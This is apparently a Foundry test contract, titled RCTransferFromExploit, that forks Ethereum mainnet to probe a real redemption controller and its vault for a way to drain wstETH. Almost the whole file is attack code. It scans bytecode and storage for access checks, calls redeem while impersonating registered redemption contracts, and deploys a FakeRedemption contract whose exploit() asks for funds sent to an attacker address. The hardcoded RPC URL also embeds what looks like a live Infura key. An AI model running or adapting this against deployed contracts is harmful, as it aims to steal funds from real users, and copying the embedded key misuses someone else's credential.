// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

interface IRedemptionController {
    function UNDERLYING() external view returns (address);
    function VAULT() external view returns (address);
    function redeem(uint256 amount, address to) external;
    function rescueERC20(address token, address to, uint256 amount) external;
    function owner() external view returns (address);
    function paused() external view returns (bool);
    function getRedemptionContracts() external view returns (address[] memory);
}

interface IRedemption {
    function redeem(uint96 amount) external;
    function finalizeRedeem(uint256 index) external;
    function cancelRedeem(uint256 index) external;
    function IAU() external view returns (address);
    function VAULT() external view returns (address);
    function REDEMPTION_CONTROLLER() external view returns (address);
    function waitingPeriod() external view returns (uint32);
}

contract RCTransferFromExploit is Test {
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeRCTransferFromContext() public view {
        console.log("=== ANALYZING RC TRANSFERFROM CONTEXT ===\n");

        bytes memory code = REDEMPTION_CONTROLLER.code;

        // Find transferFrom selector and analyze context
        bytes4 transferFromSel = bytes4(keccak256("transferFrom(address,address,uint256)"));
        console.log("transferFrom selector:");
        console.logBytes4(transferFromSel);

        for (uint i = 0; i + 3 < code.length; i++) {
            bytes4 sel = bytes4(bytes.concat(code[i], code[i+1], code[i+2], code[i+3]));
            if (sel == transferFromSel) {
                console.log("\nFound transferFrom at offset:", i);

                // Look at the 100 bytes BEFORE the selector (params setup)
                console.log("Context BEFORE transferFrom:");

                uint256 start = i > 100 ? i - 100 : 0;
                for (uint j = start; j < i; j++) {
                    uint8 op = uint8(code[j]);

                    // CALLDATALOAD = 0x35 (reading from calldata)
                    if (op == 0x35) {
                        console.log("  CALLDATALOAD at:", j);
                    }
                    // SLOAD = 0x54 (reading from storage)
                    if (op == 0x54) {
                        console.log("  SLOAD at:", j);
                    }
                    // CALLER = 0x33 (msg.sender)
                    if (op == 0x33) {
                        console.log("  CALLER (msg.sender) at:", j);
                    }
                    // PUSH20 = 0x73 (hardcoded address)
                    if (op == 0x73) {
                        console.log("  PUSH20 at:", j);
                        if (j + 21 <= code.length) {
                            bytes memory addrBytes = new bytes(20);
                            for (uint k = 0; k < 20; k++) {
                                addrBytes[k] = code[j + 1 + k];
                            }
                            console.log("    Embedded address:");
                            console.logBytes(addrBytes);
                        }
                    }
                }
            }
        }
    }

    function test_TraceRCRedeem() public {
        console.log("=== TRACING RC REDEEM FUNCTION ===\n");

        // The redeem function in RC likely:
        // 1. Validates caller (registered redemption contract?)
        // 2. Calls transferFrom(Vault, to, amount)

        vm.startPrank(attacker);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        // Try calling redeem directly
        console.log("\n1. Trying RC.redeem(1e18, attacker)...");
        (bool success, bytes memory data) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 1e18, attacker)
        );
        console.log("Success:", success);
        if (!success && data.length >= 4 && data.length < 100) {
            bytes4 errorSel = bytes4(data);
            console.log("Error selector:");
            console.logBytes4(errorSel);
        }

        // Try with different amount
        console.log("\n2. Trying RC.redeem(0, attacker)...");
        (success, data) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 0, attacker)
        );
        console.log("Success:", success);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault wstETH after:", vaultAfter / 1e18);
    }

    function test_TryAsRedemptionContract() public {
        console.log("=== TRYING AS REDEMPTION CONTRACT ===\n");

        // The RC might check if caller is a registered redemption contract
        // Let's try calling redeem while pranking as one of them

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        // Prank as Redemption 0
        vm.startPrank(REDEMPTION_0);

        console.log("Calling as Redemption 0:", REDEMPTION_0);
        (bool success, bytes memory data) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 1e18, attacker)
        );
        console.log("Success:", success);
        if (!success && data.length >= 4 && data.length < 100) {
            console.logBytes(data);
        }

        vm.stopPrank();

        // Prank as Redemption 1
        vm.startPrank(REDEMPTION_1);

        console.log("\nCalling as Redemption 1:", REDEMPTION_1);
        (success, data) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 1e18, attacker)
        );
        console.log("Success:", success);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault wstETH after:", vaultAfter / 1e18);

        if (vaultAfter < vaultBefore) {
            console.log("*** VAULT DRAINED! ***");
            console.log("Attacker received:", IERC20(wstETH).balanceOf(attacker) / 1e18, "wstETH");
        }
    }

    function test_AnalyzeRedemptionToRCFlow() public view {
        console.log("=== ANALYZING REDEMPTION -> RC FLOW ===\n");

        // When a user calls Redemption.finalizeRedeem(), it likely calls RC.redeem()
        // Let's trace this flow

        IRedemption r = IRedemption(REDEMPTION_0);

        console.log("Redemption 0 configuration:");
        console.log("  IAU:", r.IAU());
        console.log("  VAULT:", r.VAULT());
        console.log("  REDEMPTION_CONTROLLER:", r.REDEMPTION_CONTROLLER());
        console.log("  Waiting period:", r.waitingPeriod(), "seconds");

        // Check Redemption bytecode for RC.redeem call
        bytes memory code = REDEMPTION_0.code;

        // Look for redeem(uint256,address) selector
        bytes4 redeemSel = bytes4(keccak256("redeem(uint256,address)"));
        console.log("\nredeem(uint256,address) selector:");
        console.logBytes4(redeemSel);

        bool foundRedeem = false;
        for (uint i = 0; i + 3 < code.length; i++) {
            bytes4 sel = bytes4(bytes.concat(code[i], code[i+1], code[i+2], code[i+3]));
            if (sel == redeemSel) {
                foundRedeem = true;
                console.log("Found in Redemption 0 at offset:", i);
            }
        }

        if (foundRedeem) {
            console.log("\nRedemption 0 CALLS RC.redeem()!");
        }
    }

    function test_ExploitViaFakeRedemption() public {
        console.log("=== EXPLOIT VIA FAKE REDEMPTION ===\n");

        // Deploy a fake redemption contract that calls RC.redeem()
        FakeRedemption fake = new FakeRedemption(REDEMPTION_CONTROLLER, VAULT, wstETH, attacker);

        console.log("Fake redemption deployed:", address(fake));

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        // Try to call RC.redeem via our fake redemption
        vm.startPrank(address(fake));

        console.log("\nCalling RC.redeem as fake redemption...");
        (bool success,) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        console.log("Success:", success);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH after:", vaultAfter / 1e18);

        if (vaultAfter < vaultBefore) {
            console.log("\n*** EXPLOIT SUCCESSFUL! ***");
        }
    }

    function test_CheckRCAccessControl() public view {
        console.log("=== CHECKING RC ACCESS CONTROL ===\n");

        // Check if RC has any modifiers or checks we can bypass

        bytes memory code = REDEMPTION_CONTROLLER.code;

        // Count common access control patterns
        uint256 ownerChecks = 0;  // CALLER followed by SLOAD comparison
        uint256 pausedChecks = 0;

        // Look for owner() call pattern
        bytes4 ownerSel = bytes4(keccak256("owner()"));
        bytes4 pausedSel = bytes4(keccak256("paused()"));

        for (uint i = 0; i + 3 < code.length; i++) {
            bytes4 sel = bytes4(bytes.concat(code[i], code[i+1], code[i+2], code[i+3]));
            if (sel == ownerSel) ownerChecks++;
            if (sel == pausedSel) pausedChecks++;
        }

        console.log("owner() references:", ownerChecks);
        console.log("paused() references:", pausedChecks);

        // Check owner
        IRedemptionController rc = IRedemptionController(REDEMPTION_CONTROLLER);
        console.log("\nRC owner:", rc.owner());
        console.log("RC paused:", rc.paused());
        console.log("RC UNDERLYING:", rc.UNDERLYING());
        console.log("RC VAULT:", rc.VAULT());
    }

    function test_CheckStorageSlots() public view {
        console.log("=== CHECKING RC STORAGE SLOTS ===\n");

        // Read RC storage to understand its state

        console.log("RC Storage slots:");
        for (uint i = 0; i < 20; i++) {
            bytes32 slot = vm.load(REDEMPTION_CONTROLLER, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i);
                console.logBytes32(slot);
            }
        }

        // Check EIP-1967 slots
        bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        bytes32 implValue = vm.load(REDEMPTION_CONTROLLER, implSlot);
        console.log("\nImplementation slot:");
        console.logBytes32(implValue);
    }

    function test_TraceWhenRedeemIsCalled() public {
        console.log("=== TRACING WHEN REDEEM IS CALLED ===\n");

        // The normal flow is:
        // 1. User calls Redemption.redeem(amount) - starts redemption
        // 2. Wait for waiting period
        // 3. User calls Redemption.finalizeRedeem(index) - completes redemption
        // 4. Redemption calls RC.redeem(amount, to) - transfers wstETH

        // If we can manipulate step 4, we can drain

        // Let's see if finalizeRedeem has any checks we can bypass
        bytes memory redemptionCode = REDEMPTION_0.code;

        // Look for RC address in Redemption bytecode
        bytes20 rcAddr = bytes20(REDEMPTION_CONTROLLER);

        console.log("Looking for RC address in Redemption 0 bytecode...");
        for (uint i = 0; i + 19 < redemptionCode.length; i++) {
            bytes20 found;
            for (uint j = 0; j < 20; j++) {
                found |= bytes20(bytes1(redemptionCode[i + j])) >> (8 * (19 - j));
            }
            if (found == rcAddr) {
                console.log("Found RC at offset:", i);
            }
        }
    }
}

contract FakeRedemption {
    address public redemptionController;
    address public vault;
    address public wstETH;
    address public attacker;

    constructor(address _rc, address _vault, address _wstETH, address _attacker) {
        redemptionController = _rc;
        vault = _vault;
        wstETH = _wstETH;
        attacker = _attacker;
    }

    function exploit() external {
        (bool success,) = redemptionController.call(
            abi.encodeWithSignature("redeem(uint256,address)", 1000e18, attacker)
        );
        require(success, "exploit failed");
    }

    // Mimic Redemption interface
    function VAULT() external view returns (address) {
        return vault;
    }

    function IAU() external pure returns (address) {
        return address(0);
    }

    receive() external payable {}
}
